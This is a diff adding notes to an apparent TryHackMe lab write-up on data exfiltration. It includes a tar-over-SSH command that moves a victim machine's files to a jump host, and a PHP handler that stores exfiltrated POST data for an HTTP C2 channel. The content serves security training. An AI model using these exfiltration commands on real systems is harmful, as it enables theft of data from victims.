@@ -37,3 +37,32 @@ thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.t
 0+1 records out
 260 bytes transferred in 0.000321 secs (810192 bytes/sec)
 ```
+
+### Exfiltration using SSH
+- Exfiltration data from the victim1 machine
+```
+thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+```
+
+## C2 Communications
+![exfiltrarion2](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/f32ff963-384a-4d9a-8ebb-91bf35fdc5e1)  
+
+### Exfiltrate using HTTP(S)
+#### HTTP Data Exfiltration
+1. An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
+2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
+3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
+4. The attacker logs into the webserver to have a copy of the received data.  
+
+First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.   
+
+```
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+```  
+
